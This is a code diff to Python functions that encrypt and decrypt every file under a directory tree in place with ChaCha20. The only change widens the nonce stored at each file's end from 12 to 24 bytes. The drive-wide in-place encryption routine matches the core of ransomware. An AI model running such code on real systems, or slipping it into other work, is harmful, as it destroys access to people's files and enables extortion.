@@ -49,7 +49,7 @@ def fully_encrypt_drive(root: str, key: bytearray):
             with open(os.path.join(dir, file_name), mode="r+b") as file:
                 print(file.name)
 
-                nonce = secrets.token_bytes(12)     
+                nonce = secrets.token_bytes(24)     
                 cipher = ChaCha20.new(key=key, nonce=nonce)
                 while True:
                     write_offset = file.tell()
@@ -84,8 +84,8 @@ def fully_decrypt_drive(root: str, key: bytearray):
     for dir, sub_dirs, file_names in os.walk(root):
         for file_name in file_names:
             with open(os.path.join(dir, file_name), mode="r+b") as file:
-                file.seek(-12, os.SEEK_END)
-                nonce = file.read(12)
+                file.seek(-24, os.SEEK_END)
+                nonce = file.read(24)
                 file.seek(0)               
                 
                 cipher = ChaCha20.new(key=key, nonce=nonce)
@@ -98,5 +98,5 @@ def fully_decrypt_drive(root: str, key: bytearray):
                     file.seek(write_offset)                
                     file.write(plain_data)
 
-                file.seek(-12, os.SEEK_CUR)
+                file.seek(-24, os.SEEK_CUR)
                 file.truncate(file.tell())
